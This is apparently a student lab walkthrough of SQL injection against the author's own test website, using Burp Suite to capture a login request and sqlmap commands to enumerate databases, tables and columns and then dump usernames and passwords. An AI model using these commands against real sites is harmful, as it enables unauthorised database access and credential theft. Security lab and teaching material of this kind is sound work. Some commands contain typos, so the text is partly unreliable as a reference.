### 1.SQL-INJECTION USING SQLMAP TOOL

Using SQLMAP tool and Burp suite we are going to attack and retreat data from our created website(http://rafi.host/index.php)

Check for SQL Vulnerablity in targeted website if yes then proceed with following process use simple payloads to make sure site is vulnerable.

####Step-1

Open Browser and take your targeted website and give some random username and password and wait to hit login


![image](/screenshots/1.png)

####Step-2
 when i click the submit button just i did capture the requst with Burpsuit feature.

####Step-3
 After capture the request, just save the result into a test file using right click on request you will see save item option save with a random name.

####step-4 
Now open terminal tpye ls to see your test file saved or not if it save now you are ready to do SQLI.

####Step-5
Now can run the SQlmap tool by using this command.

![image](/screenshots/2.png)

command:-
***
sqlmap -r fakebook http://rafi.host/index.php --dbs  
***
 #### Note: 
 In command fakebook is my saved file using burp and the URL that our target URL --dbs means databases.


 you want to know how to use sqlmap u can just type -h for help it show more commands and its uses 

 #### Step-6
  First observe carefully you will get so many requests and finally you will get Databases list,which is stored in target website.

![image](/screenshots/5.png)

#####Now we got database list:

 1.information_schema
 2.user 


####Step-7 
Now you can collect the tables list which is stored in databases by using this command.

command:-
***
 sqlmap -r fakebook http://rafi.host/index.php -D user --tables 
 ***

#### Note: 
In command user means we are asking the tool to fetch tables from that database.

Wow you got tables,now 

 1.user
 2.users

![image](/screenshots/9.png)

#### Step-8 
Now you need to find the columns for that tables i will select users table.

command:-
***
   sqlmap -r fakebook http://rafi.host/index.php -D user -T users ---columns
   ***

   #### Note: 
    Users means in tables i have slected that to see its columns you can use any one of it.

![image](/screenshots/4.png) 
 
 #### Step-9 
 Now we get the list of columns, if you want to read the columns, use this command.

 command:-
 ***
sqlmap -r fakebook http://rafi.host/index.php -D user -T users -C id,password,username --dump
***

 ![image](/screenshots/6.png)

 Now you can see all ids,passwords,usernames using those you can login in our target page you cracked it sucessfully BOOM!